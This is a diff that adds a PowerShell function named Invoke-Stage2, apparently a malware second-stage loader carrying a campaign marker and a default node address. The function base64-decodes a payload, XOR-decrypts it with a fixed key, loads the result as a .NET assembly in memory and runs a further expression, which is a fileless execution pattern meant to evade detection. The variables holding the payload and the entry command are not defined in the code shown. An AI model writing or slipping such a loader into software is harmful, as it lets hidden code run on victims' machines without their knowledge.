@@ -1,0 +1,9 @@
+function Invoke-Stage2 {
+    param([string]$Node = "192.0.2.77")
+    $marker = "NJ-CAMPAIGN-0x5A"
+    $k = 0x5A
+    $raw = [Convert]::FromBase64String($Payload)
+    for ($i=0; $i -lt $raw.Length; $i++) { $raw[$i] = $raw[$i] -bxor $k }
+    [Reflection.Assembly]::Load($raw) | Out-Null
+    Invoke-Expression $Entry
+}
